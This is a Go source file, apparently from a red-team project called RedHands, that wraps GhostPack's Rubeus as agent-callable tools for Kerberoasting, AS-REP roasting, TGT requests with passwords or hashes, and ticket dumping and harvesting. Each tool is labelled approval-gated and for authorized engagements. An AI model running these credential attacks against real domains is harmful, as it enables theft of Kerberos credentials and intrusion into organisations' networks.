// Package rubeus wraps the GhostPack Rubeus Kerberos interaction toolset for
// use in authorized engagements only.
//
// Feasibility note: GhostPack deliberately does not publish compiled Rubeus
// builds ("we do not release compiled versions of Rubeus") — the GitHub
// releases contain no binary assets. Rubeus is a .NET Framework Windows tool
// that P/Invokes Windows LSA APIs (advapi32/secur32), so this wrapper targets
// Windows/lab hosts where RedHands runs and an operator-compiled Rubeus.exe
// is installed on PATH under the allowlisted name "rubeus" (os/exec resolves
// "rubeus" to rubeus.exe on Windows). The command surface wrapped here is
// verified against the upstream Rubeus/Commands/*.cs argument parsers.
//
// Rubeus flags use the /flag:value style. Values may legitimately contain
// '/', ':' (flag separator), '=' and '\' (DOMAIN\user), which the binary
// executor permits; only the executor's forbidden metacharacter set is
// rejected. No local filesystem checks are performed on output file paths
// because the paths are interpreted by the host running the rubeus binary.
package rubeus

import (
	"context"
	"encoding/json"
	"fmt"
	"strconv"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// ---------------------------------------------------------------------------
// KerberoastTool - rubeus_kerberoast
// ---------------------------------------------------------------------------

// KerberoastInput models the rubeus_kerberoast parameters.
type KerberoastInput struct {
	Op      string `json:"op,omitempty"`
	User    string `json:"user,omitempty"`
	Domain  string `json:"domain,omitempty"`
	DC      string `json:"dc,omitempty"`
	OutFile string `json:"outfile,omitempty"`
	NoWrap  bool   `json:"nowrap,omitempty"`
}

// KerberoastTool wraps `rubeus kerberoast`.
type KerberoastTool struct {
	exec executor.Executor
}

// NewKerberoast constructs a rubeus_kerberoast tool.
func NewKerberoast(exec executor.Executor) *KerberoastTool {
	return &KerberoastTool{exec: exec}
}

func (t *KerberoastTool) Name() string { return "rubeus_kerberoast" }

func (t *KerberoastTool) Description() string {
	return "Request Kerberos service tickets for accounts with SPNs and extract crackable hashes (Kerberoasting) " +
		"using Rubeus. Defaults to RC4 roasting; op aes requests AES tickets and op rc4opsec filters out " +
		"AES-enabled accounts for stealth. Optionally filter by /user, or write hashes to an outfile. " +
		"HIGH IMPACT: attacks the domain Kerberos KDC and yields offline-crackable credential material; " +
		"authorized lab/engagement targets only; approval-gated. Requires the rubeus binary (operator-compiled " +
		"Rubeus) on the host running RedHands; Rubeus is a Windows tool."
}

func (t *KerberoastTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"op": {
				"type": "string",
				"description": "Roasting operation: rc4 (default, request RC4-encrypted tickets), aes (request AES tickets), rc4opsec (tgtdeleg-based, filters AES-enabled accounts for opsec)",
				"enum": ["rc4", "aes", "rc4opsec"]
			},
			"user": {
				"type": "string",
				"description": "Restrict roasting to a single user SAM name (/user:USER)"
			},
			"domain": {
				"type": "string",
				"description": "Target domain FQDN (defaults to the host's current domain) (/domain:)"
			},
			"dc": {
				"type": "string",
				"description": "Domain controller to query (/dc:)"
			},
			"outfile": {
				"type": "string",
				"description": "Write roasted hashes to this file, one per line (/outfile:)"
			},
			"nowrap": {
				"type": "boolean",
				"description": "Do not column-wrap base64 ticket blobs (/nowrap)"
			}
		}
	}`)
}

func (t *KerberoastTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input KerberoastInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.Op == "" {
		input.Op = "rc4"
	}
	if input.Op != "rc4" && input.Op != "aes" && input.Op != "rc4opsec" {
		return errorResult(fmt.Sprintf("op must be one of: rc4, aes, rc4opsec (got %q)", input.Op)), nil
	}
	if err := validateSafeString(input.User, "user"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.DC, "dc"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.OutFile, "outfile"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"kerberoast"}
	if input.Op == "aes" {
		args = append(args, "/aes")
	} else if input.Op == "rc4opsec" {
		args = append(args, "/rc4opsec")
	}
	if input.User != "" {
		args = append(args, "/user:"+input.User)
	}
	if input.Domain != "" {
		args = append(args, "/domain:"+input.Domain)
	}
	if input.DC != "" {
		args = append(args, "/dc:"+input.DC)
	}
	if input.OutFile != "" {
		args = append(args, "/outfile:"+input.OutFile)
	}
	if input.NoWrap {
		args = append(args, "/nowrap")
	}

	result, err := t.exec.Run(ctx, "rubeus", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("rubeus kerberoast failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## Rubeus Kerberoast\n\n")
	fmt.Fprintf(&sb, "**Mode**: %s\n\n", input.Op)
	if output == "" {
		sb.WriteString("No kerberoastable accounts found (or no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// ---------------------------------------------------------------------------
// AskTgtTool - rubeus_asktgt
// ---------------------------------------------------------------------------

// AskTgtInput models the rubeus_asktgt parameters.
type AskTgtInput struct {
	User     string `json:"user"`
	Password string `json:"password,omitempty"`
	RC4      string `json:"rc4,omitempty"`
	AES256   string `json:"aes256,omitempty"`
	Domain   string `json:"domain,omitempty"`
	DC       string `json:"dc,omitempty"`
	Enctype  string `json:"enctype,omitempty"`
	OutFile  string `json:"outfile,omitempty"`
	NoWrap   bool   `json:"nowrap,omitempty"`
}

// AskTgtTool wraps `rubeus asktgt`.
type AskTgtTool struct {
	exec executor.Executor
}

// NewAskTgt constructs a rubeus_asktgt tool.
func NewAskTgt(exec executor.Executor) *AskTgtTool {
	return &AskTgtTool{exec: exec}
}

func (t *AskTgtTool) Name() string { return "rubeus_asktgt" }

func (t *AskTgtTool) Description() string {
	return "Request a ticket-granting-ticket (TGT) from the domain KDC using a password, RC4/NTLM hash, or AES256 " +
		"key via Rubeus (asktgt), returning the .kirbi as a base64 blob. With a password, enctype selects the " +
		"pre-auth encryption type. HIGH IMPACT: obtains reusable Kerberos credentials for the user; " +
		"authorized lab/engagement targets only; approval-gated. Requires the rubeus binary (operator-compiled " +
		"Rubeus) on the host running RedHands; Rubeus is a Windows tool."
}

func (t *AskTgtTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"user": {
				"type": "string",
				"description": "SAM account name to request the TGT for (/user:)"
			},
			"password": {
				"type": "string",
				"description": "Plaintext password (mutually exclusive with rc4/aes256) (/password:)"
			},
			"rc4": {
				"type": "string",
				"description": "RC4/NTLM hash (32 hex characters, mutually exclusive with password/aes256) (/rc4:)"
			},
			"aes256": {
				"type": "string",
				"description": "AES256 key (64 hex characters, mutually exclusive with password/rc4) (/aes256:)"
			},
			"domain": {
				"type": "string",
				"description": "Target domain FQDN (defaults to the host's current domain) (/domain:)"
			},
			"dc": {
				"type": "string",
				"description": "Domain controller to send the AS-REQ to (/dc:)"
			},
			"enctype": {
				"type": "string",
				"description": "Pre-auth encryption type when using password (ignored otherwise)",
				"enum": ["rc4", "aes128", "aes256"]
			},
			"outfile": {
				"type": "string",
				"description": "Write the .kirbi to this file (/outfile:)"
			},
			"nowrap": {
				"type": "boolean",
				"description": "Do not column-wrap the base64 ticket blob (/nowrap)"
			}
		},
		"required": ["user"]
	}`)
}

func (t *AskTgtTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input AskTgtInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateRequired(input.User, "user"); err != nil {
		return errorResult(err.Error()), nil
	}

	// Exactly one credential source.
	creds := 0
	if input.Password != "" {
		creds++
	}
	if input.RC4 != "" {
		creds++
	}
	if input.AES256 != "" {
		creds++
	}
	if creds == 0 {
		return errorResult("exactly one of password, rc4, or aes256 is required"), nil
	}
	if creds > 1 {
		return errorResult("password, rc4, and aes256 are mutually exclusive"), nil
	}

	if err := validateSafeString(input.Password, "password"); err != nil {
		return errorResult(err.Error()), nil
	}
	if input.RC4 != "" {
		if err := validateHexHash(input.RC4, 32, "rc4"); err != nil {
			return errorResult(err.Error()), nil
		}
	}
	if input.AES256 != "" {
		if err := validateHexHash(input.AES256, 64, "aes256"); err != nil {
			return errorResult(err.Error()), nil
		}
	}
	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.DC, "dc"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.OutFile, "outfile"); err != nil {
		return errorResult(err.Error()), nil
	}
	if input.Enctype != "" {
		if input.Enctype != "rc4" && input.Enctype != "aes128" && input.Enctype != "aes256" {
			return errorResult(fmt.Sprintf("enctype must be one of: rc4, aes128, aes256 (got %q)", input.Enctype)), nil
		}
		if input.Password == "" {
			return errorResult("enctype only applies when password is set (hashes imply their own encryption type)"), nil
		}
	}

	args := []string{"asktgt", "/user:" + input.User}
	if input.Password != "" {
		args = append(args, "/password:"+input.Password)
		if input.Enctype != "" {
			args = append(args, "/enctype:"+input.Enctype)
		}
	}
	if input.RC4 != "" {
		args = append(args, "/rc4:"+input.RC4)
	}
	if input.AES256 != "" {
		args = append(args, "/aes256:"+input.AES256)
	}
	if input.Domain != "" {
		args = append(args, "/domain:"+input.Domain)
	}
	if input.DC != "" {
		args = append(args, "/dc:"+input.DC)
	}
	if input.OutFile != "" {
		args = append(args, "/outfile:"+input.OutFile)
	}
	if input.NoWrap {
		args = append(args, "/nowrap")
	}

	result, err := t.exec.Run(ctx, "rubeus", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("rubeus asktgt failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## Rubeus Ask TGT\n\n")
	fmt.Fprintf(&sb, "**User**: %s\n\n", input.User)
	if output == "" {
		sb.WriteString("TGT request completed with no output.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// ---------------------------------------------------------------------------
// AsRepRoastTool - rubeus_asreproast
// ---------------------------------------------------------------------------

// AsRepRoastInput models the rubeus_asreproast parameters.
type AsRepRoastInput struct {
	User    string `json:"user,omitempty"`
	OU      string `json:"ou,omitempty"`
	Domain  string `json:"domain,omitempty"`
	DC      string `json:"dc,omitempty"`
	Format  string `json:"format,omitempty"`
	OutFile string `json:"outfile,omitempty"`
	LDAPS   bool   `json:"ldaps,omitempty"`
	NoWrap  bool   `json:"nowrap,omitempty"`
}

// AsRepRoastTool wraps `rubeus asreproast`.
type AsRepRoastTool struct {
	exec executor.Executor
}

// NewAsRepRoast constructs a rubeus_asreproast tool.
func NewAsRepRoast(exec executor.Executor) *AsRepRoastTool {
	return &AsRepRoastTool{exec: exec}
}

func (t *AsRepRoastTool) Name() string { return "rubeus_asreproast" }

func (t *AsRepRoastTool) Description() string {
	return "Extract crackable AS-REP hashes for domain accounts that do not require Kerberos pre-authentication " +
		"(AS-REP roasting) using Rubeus. Roasts all such accounts by default, a single user, or an OU; output " +
		"in John or hashcat (mode 18200) format. HIGH IMPACT: harvests offline-crackable credential material " +
		"from the domain KDC; authorized lab/engagement targets only; approval-gated. Requires the rubeus binary " +
		"(operator-compiled Rubeus) on the host running RedHands; Rubeus is a Windows tool."
}

func (t *AsRepRoastTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"user": {
				"type": "string",
				"description": "Roast only this user (/user:USER); roasts every no-preauth account when omitted"
			},
			"ou": {
				"type": "string",
				"description": "Roast only users in this LDAP organizational unit (/ou:)"
			},
			"domain": {
				"type": "string",
				"description": "Target domain FQDN (defaults to the host's current domain) (/domain:)"
			},
			"dc": {
				"type": "string",
				"description": "Domain controller to query (/dc:)"
			},
			"format": {
				"type": "string",
				"description": "Hash output format (defaults to john)",
				"enum": ["john", "hashcat"]
			},
			"outfile": {
				"type": "string",
				"description": "Write roasted hashes to this file, one per line (/outfile:)"
			},
			"ldaps": {
				"type": "boolean",
				"description": "Use LDAPS (TLS port 636) for LDAP queries (/ldaps)"
			},
			"nowrap": {
				"type": "boolean",
				"description": "Do not column-wrap base64 output (/nowrap)"
			}
		}
	}`)
}

func (t *AsRepRoastTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input AsRepRoastInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.Format != "" && input.Format != "john" && input.Format != "hashcat" {
		return errorResult("format must be one of: john, hashcat"), nil
	}
	if err := validateSafeString(input.User, "user"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.OU, "ou"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.DC, "dc"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.OutFile, "outfile"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"asreproast"}
	if input.User != "" {
		args = append(args, "/user:"+input.User)
	}
	if input.OU != "" {
		args = append(args, "/ou:"+input.OU)
	}
	if input.Domain != "" {
		args = append(args, "/domain:"+input.Domain)
	}
	if input.DC != "" {
		args = append(args, "/dc:"+input.DC)
	}
	if input.Format != "" {
		args = append(args, "/format:"+input.Format)
	}
	if input.OutFile != "" {
		args = append(args, "/outfile:"+input.OutFile)
	}
	if input.LDAPS {
		args = append(args, "/ldaps")
	}
	if input.NoWrap {
		args = append(args, "/nowrap")
	}

	result, err := t.exec.Run(ctx, "rubeus", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("rubeus asreproast failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## Rubeus AS-REP Roast\n\n")
	format := input.Format
	if format == "" {
		format = "john"
	}
	fmt.Fprintf(&sb, "**Format**: %s\n\n", format)
	if output == "" {
		sb.WriteString("No AS-REP roastable accounts found (or no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// ---------------------------------------------------------------------------
// HarvestTool - rubeus_harvest
// ---------------------------------------------------------------------------

// HarvestInput models the rubeus_harvest parameters.
type HarvestInput struct {
	Interval        int    `json:"interval,omitempty"`
	MonitorInterval int    `json:"monitor_interval,omitempty"`
	DisplayInterval int    `json:"display_interval,omitempty"`
	TargetUser      string `json:"targetuser,omitempty"`
	RunFor          int    `json:"runfor,omitempty"`
	NoWrap          bool   `json:"nowrap,omitempty"`
}

// HarvestTool wraps `rubeus harvest`.
type HarvestTool struct {
	exec executor.Executor
}

// NewHarvest constructs a rubeus_harvest tool.
func NewHarvest(exec executor.Executor) *HarvestTool {
	return &HarvestTool{exec: exec}
}

func (t *HarvestTool) Name() string { return "rubeus_harvest" }

func (t *HarvestTool) Description() string {
	return "Continuously harvest usable TGTs from a host with Rubeus (harvest): every monitor interval new TGTs are " +
		"extracted and kept in a cache, expiring tickets are auto-renewed, and the valid cache is displayed every " +
		"display interval. Requires elevation. Use runfor to bound the runtime. HIGH IMPACT: extracts live Kerberos " +
		"credentials from a compromised host; authorized lab/engagement targets only; approval-gated. Requires the " +
		"rubeus binary (operator-compiled Rubeus) on the host running RedHands; Rubeus is a Windows tool."
}

func (t *HarvestTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"interval": {
				"type": "integer",
				"description": "Convenience interval (seconds) that sets both monitor and display intervals (/interval:)"
			},
			"monitor_interval": {
				"type": "integer",
				"description": "Seconds between TGT extraction passes, default 60 (/monitorinterval:)"
			},
			"display_interval": {
				"type": "integer",
				"description": "Seconds between cache displays, default 1200 (/displayinterval:)"
			},
			"targetuser": {
				"type": "string",
				"description": "Only harvest TGTs for this user (/targetuser:)"
			},
			"runfor": {
				"type": "integer",
				"description": "Stop harvesting after this many seconds; unbounded when omitted (/runfor:)"
			},
			"nowrap": {
				"type": "boolean",
				"description": "Do not column-wrap base64 ticket blobs (/nowrap)"
			}
		}
	}`)
}

func (t *HarvestTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input HarvestInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	for _, iv := range []struct {
		name string
		val  int
	}{
		{"interval", input.Interval},
		{"monitor_interval", input.MonitorInterval},
		{"display_interval", input.DisplayInterval},
		{"runfor", input.RunFor},
	} {
		if iv.val != 0 && (iv.val < 1 || iv.val > 86400) {
			return errorResult(fmt.Sprintf("%s must be between 1 and 86400 seconds", iv.name)), nil
		}
	}
	if input.Interval != 0 && (input.MonitorInterval != 0 || input.DisplayInterval != 0) {
		return errorResult("interval cannot be combined with monitor_interval/display_interval (it sets both)"), nil
	}
	if err := validateSafeString(input.TargetUser, "targetuser"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"harvest"}
	if input.Interval != 0 {
		args = append(args, "/interval:"+strconv.Itoa(input.Interval))
	}
	if input.MonitorInterval != 0 {
		args = append(args, "/monitorinterval:"+strconv.Itoa(input.MonitorInterval))
	}
	if input.DisplayInterval != 0 {
		args = append(args, "/displayinterval:"+strconv.Itoa(input.DisplayInterval))
	}
	if input.TargetUser != "" {
		args = append(args, "/targetuser:"+input.TargetUser)
	}
	if input.RunFor != 0 {
		args = append(args, "/runfor:"+strconv.Itoa(input.RunFor))
	}
	if input.NoWrap {
		args = append(args, "/nowrap")
	}

	result, err := t.exec.Run(ctx, "rubeus", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("rubeus harvest failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## Rubeus Harvest\n\n")
	if output == "" {
		sb.WriteString("Harvest completed with no output (was runfor set?).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// ---------------------------------------------------------------------------
// DumpTool - rubeus_dump
// ---------------------------------------------------------------------------

// DumpInput models the rubeus_dump parameters.
type DumpInput struct {
	LUID    string `json:"luid,omitempty"`
	User    string `json:"user,omitempty"`
	Service string `json:"service,omitempty"`
	Server  string `json:"server,omitempty"`
	NoWrap  bool   `json:"nowrap,omitempty"`
}

// DumpTool wraps `rubeus dump`.
type DumpTool struct {
	exec executor.Executor
}

// NewDump constructs a rubeus_dump tool.
func NewDump(exec executor.Executor) *DumpTool {
	return &DumpTool{exec: exec}
}

func (t *DumpTool) Name() string { return "rubeus_dump" }

func (t *DumpTool) Description() string {
	return "Dump all Kerberos ticket data on the host as base64 .kirbi blobs using Rubeus (dump). When elevated, " +
		"tickets for all users are dumped; filter by logon session LUID, user, service, or server. HIGH IMPACT: " +
		"extracts live Kerberos credentials from a compromised host; authorized lab/engagement targets only; " +
		"approval-gated. Requires the rubeus binary (operator-compiled Rubeus) on the host running RedHands; " +
		"Rubeus is a Windows tool."
}

func (t *DumpTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"luid": {
				"type": "string",
				"description": "Only dump tickets for this logon session ID, e.g. 0x3e7 (/luid:)"
			},
			"user": {
				"type": "string",
				"description": "Only dump tickets for this user (/user:)"
			},
			"service": {
				"type": "string",
				"description": "Only dump tickets for this service, e.g. krbtgt (/service:)"
			},
			"server": {
				"type": "string",
				"description": "Only dump tickets for this server (/server:)"
			},
			"nowrap": {
				"type": "boolean",
				"description": "Do not column-wrap base64 ticket blobs (/nowrap)"
			}
		}
	}`)
}

func (t *DumpTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DumpInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if input.LUID != "" {
		if err := validateLUID(input.LUID); err != nil {
			return errorResult("luid: " + err.Error()), nil
		}
	}
	if err := validateSafeString(input.User, "user"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Service, "service"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Server, "server"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"dump"}
	if input.LUID != "" {
		args = append(args, "/luid:"+input.LUID)
	}
	if input.User != "" {
		args = append(args, "/user:"+input.User)
	}
	if input.Service != "" {
		args = append(args, "/service:"+input.Service)
	}
	if input.Server != "" {
		args = append(args, "/server:"+input.Server)
	}
	if input.NoWrap {
		args = append(args, "/nowrap")
	}

	result, err := t.exec.Run(ctx, "rubeus", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("rubeus dump failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## Rubeus Ticket Dump\n\n")
	if output == "" {
		sb.WriteString("No tickets found (or no output).\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}

// ---------------------------------------------------------------------------
// DescribeTool - rubeus_describe
// ---------------------------------------------------------------------------

// DescribeInput models the rubeus_describe parameters.
type DescribeInput struct {
	Ticket        string `json:"ticket"`
	ServiceUser   string `json:"serviceuser,omitempty"`
	ServiceDomain string `json:"servicedomain,omitempty"`
	NoWrap        bool   `json:"nowrap,omitempty"`
}

// DescribeTool wraps `rubeus describe`.
type DescribeTool struct {
	exec executor.Executor
}

// NewDescribe constructs a rubeus_describe tool.
func NewDescribe(exec executor.Executor) *DescribeTool {
	return &DescribeTool{exec: exec}
}

func (t *DescribeTool) Name() string { return "rubeus_describe" }

func (t *DescribeTool) Description() string {
	return "Parse and describe a Kerberos ticket (TGT or service ticket) supplied as a base64 .kirbi blob using " +
		"Rubeus (describe): prints user, service, realm, lifetimes, flags, key type, and session key. Read-only " +
		"parsing, no domain traffic. Optional serviceuser/servicedomain aid AES session-key hash generation. " +
		"HIGH IMPACT toolset: Rubeus is offensive Kerberos tooling for authorized lab/engagement use only; " +
		"approval-gated. Requires the rubeus binary (operator-compiled Rubeus) on the host running RedHands; " +
		"Rubeus is a Windows tool."
}

func (t *DescribeTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"ticket": {
				"type": "string",
				"description": "Base64-encoded .kirbi ticket blob to parse (/ticket:)"
			},
			"serviceuser": {
				"type": "string",
				"description": "SAM name of the service account, for AES service ticket hash generation (/serviceuser:)"
			},
			"servicedomain": {
				"type": "string",
				"description": "FQDN of the service account's domain (/servicedomain:)"
			},
			"nowrap": {
				"type": "boolean",
				"description": "Do not column-wrap base64 output (/nowrap)"
			}
		},
		"required": ["ticket"]
	}`)
}

func (t *DescribeTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DescribeInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateBase64Ticket(input.Ticket, "ticket"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.ServiceUser, "serviceuser"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.ServiceDomain, "servicedomain"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"describe", "/ticket:" + input.Ticket}
	if input.ServiceUser != "" {
		args = append(args, "/serviceuser:"+input.ServiceUser)
	}
	if input.ServiceDomain != "" {
		args = append(args, "/servicedomain:"+input.ServiceDomain)
	}
	if input.NoWrap {
		args = append(args, "/nowrap")
	}

	result, err := t.exec.Run(ctx, "rubeus", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("rubeus describe failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## Rubeus Ticket Description\n\n")
	if output == "" {
		sb.WriteString("Describe completed with no output.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return textResult(sb.String()), nil
}
